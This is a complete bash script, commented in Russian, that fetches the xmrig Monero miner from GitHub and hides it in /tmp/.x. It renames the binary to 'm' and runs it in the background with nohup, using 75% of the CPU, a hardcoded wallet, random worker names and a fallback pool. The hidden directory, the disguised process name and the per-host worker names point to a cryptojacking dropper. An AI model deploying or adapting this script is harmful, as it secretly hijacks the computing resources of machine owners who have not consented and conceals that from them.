#!/bin/bash

# Функция для логирования
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# Функция для проверки успешности выполнения команды
check_status() {
    if [ $? -eq 0 ]; then
        log_message "✓ $1"
        return 0
    else
        log_message "✗ $1"
        return 1
    fi
}

# Функция генерации случайного 12-символьного имени воркера
generate_worker_name() {
    local worker_name
    worker_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1)
    
    while [ ${#worker_name} -lt 12 ]; do
        worker_name="${worker_name}$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 1 | head -n 1)"
    done
    
    echo "$worker_name"
}

# Проверка зависимостей
check_dependencies() {
    log_message "Проверка системных зависимостей..."
    
    # Проверяем наличие необходимых команд
    local missing_deps=()
    
    for cmd in wget tar ps; do
        if ! command -v $cmd &> /dev/null; then
            missing_deps+=($cmd)
        fi
    done
    
    if [ ${#missing_deps[@]} -gt 0 ]; then
        log_message "✗ Отсутствуют необходимые команды: ${missing_deps[*]}"
        return 1
    fi
    
    log_message "✓ Все необходимые команды доступны"
    return 0
}

# Основной скрипт с логированием
log_message "=== Начало выполнения скрипта ==="

# Проверка зависимостей
check_dependencies || {
    log_message "Установите недостающие зависимости и попробуйте снова"
    exit 1
}

# Генерация имени воркера
WORKER_NAME=$(generate_worker_name)
log_message "Сгенерировано имя воркера: $WORKER_NAME"

# 1. Переход в /tmp
cd /tmp
check_status "Переход в /tmp"

# 2. Очистка и создание рабочей директории
rm -rf .x 2>/dev/null
mkdir -p /tmp/.x
check_status "Создание рабочей директории /tmp/.x"

# 3. Переход в рабочую директорию
cd /tmp/.x
check_status "Переход в /tmp/.x"

# 4. Загрузка xmrig с проверкой сети
log_message "Проверка доступности GitHub..."
if ping -c 1 github.com &> /dev/null; then
    log_message "✓ GitHub доступен"
else
    log_message "✗ GitHub недоступен, проверьте интернет-соединение"
    exit 1
fi

log_message "Начало загрузки xmrig..."
wget --timeout=30 --tries=3 https://github.com/moneroocean/xmrig/releases/download/v6.25.0-mo1/xmrig-v6.25.0-mo1-lin64-compat.tar.gz
check_status "Загрузка xmrig"

# Проверка размера скачанного файла
if [ -f "xmrig-v6.25.0-mo1-lin64-compat.tar.gz" ]; then
    file_size=$(stat -c%s "xmrig-v6.25.0-mo1-lin64-compat.tar.gz")
    log_message "Размер скачанного файла: $file_size байт"
    if [ $file_size -lt 1000000 ]; then  # Меньше 1MB - вероятно, ошибка
        log_message "⚠ Внимание: файл слишком маленький, возможно загрузка не удалась"
        log_message "Содержимое файла:"
        head -c 200 "xmrig-v6.25.0-mo1-lin64-compat.tar.gz" | od -c | head -5
        exit 1
    fi
fi

# 5. Распаковка архива
log_message "Распаковка архива..."
tar -xzf xmrig-v6.25.0-mo1-lin64-compat.tar.gz
check_status "Распаковка архива"

# 6. Проверка распакованных файлов
log_message "Список распакованных файлов:"
ls -la

# 7. Поиск исполняемого файла xmrig
if [ -f "xmrig" ]; then
    log_message "✓ Найден исполняемый файл xmrig"
else
    # Ищем файл в распакованных директориях
    log_message "Поиск xmrig в поддиректориях..."
    found_file=$(find . -name "xmrig" -type f | head -1)
    if [ -n "$found_file" ]; then
        log_message "✓ Найден файл: $found_file"
        mv "$found_file" .
    else
        log_message "✗ Файл xmrig не найден в архиве"
        log_message "Содержимое архива:"
        tar -tzf xmrig-v6.25.0-mo1-lin64-compat.tar.gz | head -20
        exit 1
    fi
fi

# 8. Установка прав выполнения
chmod +x xmrig
check_status "Установка прав выполнения для xmrig"

# 9. Проверка архитектуры и зависимостей
log_message "Проверка архитектуры системы..."
uname -m
log_message "Проверка библиотек для xmrig..."
ldd xmrig 2>&1 | head -20

# 10. Переименование файла
mv xmrig m
check_status "Переименование xmrig в m"

# 11. Проверка наличия файла
if [ -f "./m" ]; then
    log_message "✓ Файл ./m существует и готов к запуску"
    log_message "Размер файла: $(stat -c%s "./m") байт"
else
    log_message "✗ Файл ./m не найден"
    exit 1
fi

# 12. Тестовый запуск для проверки
log_message "Тестовый запуск майнера (вывод версии)..."
if ./m --version > test_output.log 2>&1; then
    log_message "✓ Майнер запускается успешно"
    log_message "Версия майнера:"
    cat test_output.log
else
    log_message "✗ Майнер не запускается. Ошибка:"
    cat test_output.log
    exit 1
fi

# 13. Запуск майнера с подробным логированием
log_message "Запуск майнера с параметрами:"
log_message "  Пул: gulf.moneroocean.stream:10128"
log_message "  Кошелек: 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE"
log_message "  Имя воркера: $WORKER_NAME"
log_message "  Потоки: 75% CPU"
log_message "  Уровень доната: 0%"

# Сохраняем имя воркера в файл для последующего использования
echo "$WORKER_NAME" > worker_name.txt
log_message "Имя воркера сохранено в файл: /tmp/.x/worker_name.txt"

# Запуск в фоновом режиме с сохранением PID
log_message "Запуск майнера..."
nohup ./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p "$WORKER_NAME" --cpu-max-threads-hint=75 -B --donate-level=0 >xmrig_output.log 2>&1 &
PID=$!

# Проверка запуска
sleep 3
if ps -p $PID > /dev/null 2>&1; then
    log_message "✓ Майнер успешно запущен (PID: $PID)"
    log_message "  Имя воркера: $WORKER_NAME"
    log_message "  Логи майнера пишутся в файл: /tmp/.x/xmrig_output.log"
    
    # Проверяем, что процесс работает
    sleep 2
    if ps -p $PID > /dev/null 2>&1; then
        log_message "✓ Процесс майнера продолжает работать"
        
        # Показываем первые строки логов
        log_message "Первые строки лога майнера:"
        tail -n 10 xmrig_output.log 2>/dev/null || log_message "  Лог файл пока пуст"
    else
        log_message "✗ Процесс майнера завершился"
        log_message "Последние строки лога:"
        tail -n 20 xmrig_output.log 2>/dev/null
    fi
else
    log_message "✗ Не удалось запустить майнер"
    log_message "Последние строки лога:"
    tail -n 20 xmrig_output.log 2>/dev/null
    log_message "Проверьте доступность пула и интернет-соединение"
    
    # Пробуем альтернативный пул
    log_message "Попытка использования альтернативного пула..."
    nohup ./m -o xmr-eu1.nanopool.org:14433 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p "$WORKER_NAME" --cpu-max-threads-hint=75 -B --donate-level=0 >xmrig_alt_output.log 2>&1 &
    PID2=$!
    sleep 2
    if ps -p $PID2 > /dev/null 2>&1; then
        log_message "✓ Майнер запущен на альтернативном пуле (PID: $PID2)"
    else
        log_message "✗ Не удалось запустить майнер даже на альтернативном пуле"
        exit 1
    fi
fi

log_message "=== Скрипт успешно завершен ==="
log_message "Текущее имя воркера: $WORKER_NAME"
log_message "Проверьте работу майнера командой: ps aux | grep -E '(m|xmrig)'"
log_message "Посмотрите логи командой: tail -f /tmp/.x/xmrig_output.log"
log_message "Проверьте соединение: netstat -tulpn | grep m"
